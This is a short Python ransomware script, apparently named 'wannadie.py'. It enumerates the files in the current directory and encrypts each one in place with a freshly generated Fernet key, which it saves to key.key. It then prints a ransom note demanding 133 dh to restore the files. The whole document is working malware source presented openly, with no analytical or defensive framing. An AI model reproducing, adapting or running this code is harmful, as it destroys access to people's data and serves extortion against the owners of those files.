#!usr/bin/ env python3

import os
from cryptography.fernet import Fernet

#Let's encrypt files

sysfiles = []
for file in os.listdir():
	if file == "wannadie.py" or file == "key.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		sysfiles.append(file)

print(sysfiles)

key = Fernet.generate_key()
with open("key.key", "wb") as thekey:
	thekey.write(key)

for file in sysfiles:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encr = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encr)

print("All of your files have been encrypted by @AhmedABS,send me 133 dh to get the password to get them back (^_^)")
